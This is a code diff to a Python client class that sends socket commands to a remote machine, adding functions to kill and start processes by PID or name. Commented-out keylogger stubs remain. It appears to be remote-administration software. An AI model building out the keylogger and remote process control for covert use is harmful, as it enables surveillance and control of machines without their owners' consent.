@@ -52,6 +52,21 @@ class ClientServices:
         self.buff.send('processlist!F!'.encode())
         return self.recvDump()
 
+    # kill process func
+    def sendKillProcess(self, pid):
+        print('SEND KILL PROCESS SIGNAL')
+
+        self.buff.send('killprocess!F!'.encode())
+        self.buff.send(str(pid).encode() + self.DELIM)
+        return self.buff.recv_until(self.DELIM).decode()
+
+    def sendStartProcess(self, name):
+        print('SEND START PROCESS SIGNAL')
+
+        self.buff.send('startprocess!F!'.encode())
+        self.buff.send(str(name).encode() + self.DELIM)
+        return self.buff.recv_until(self.DELIM).decode()
+
     # # keylogger func
     # def keylogger_Start(buff):
     # buff.send('keylogger!F!'.encode())
@@ -63,12 +78,7 @@ class ClientServices:
     #     keylogger_Command(buff, 'send')
     #     return buff.recv_until(DELIM).decode()
         
-    # # kill process func
-    # def sendKillProcess(buff, pid):
-    #     print('SEND KILL PROCESS SIGNAL')
-
-    #     buff.send('killprocess!F!'.encode())
-    #     buff.send(str(pid).encode() + DELIM)
+    
         
 
 
